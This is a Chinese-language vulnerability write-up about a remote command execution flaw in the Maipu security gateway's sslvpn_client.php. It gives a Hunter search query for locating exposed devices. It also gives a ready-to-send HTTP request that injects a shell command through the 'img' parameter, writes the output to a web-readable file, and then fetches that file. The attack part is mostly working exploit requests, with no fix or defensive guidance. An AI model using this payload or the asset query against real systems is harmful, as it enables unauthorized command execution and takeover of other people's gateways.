# 迈普安全网关sslvpn_client存在远程命令执行漏洞

# 一、漏洞简介
迈普安全网关sslvpn_client存在远程命令执行漏洞，攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ 迈普安全网关

# 三、资产测绘
+ hunter`app.name=="MAIPU 迈普 MPSec"`
+ 特征![1701762281066-80c83a70-903d-4273-a66a-5df08ae34227.png](./img/nYJI0-JcxcVBhRa7/1701762281066-80c83a70-903d-4273-a66a-5df08ae34227-374241.png)

# 四、漏洞复现
```java
GET /sslvpn/sslvpn_client.php?client=logoImg&img=x%20/tmp|echo%20%60whoami%60%20|tee%20/usr/local/webui/sslvpn/ceshi.txt|ls HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```

![1701762310844-e2bb6845-f268-450b-b1ef-4ddc2f30876e.png](./img/nYJI0-JcxcVBhRa7/1701762310844-e2bb6845-f268-450b-b1ef-4ddc2f30876e-132060.png)

获取命令执行结果

```java
GET /sslvpn/ceshi.txt HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```

![1701762342384-224cbced-19ed-428d-b26d-9957865251d2.png](./img/nYJI0-JcxcVBhRa7/1701762342384-224cbced-19ed-428d-b26d-9957865251d2-844096.png)



> 更新: 2024-02-29 23:57:12  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gkyi7fg6n1r30x4f>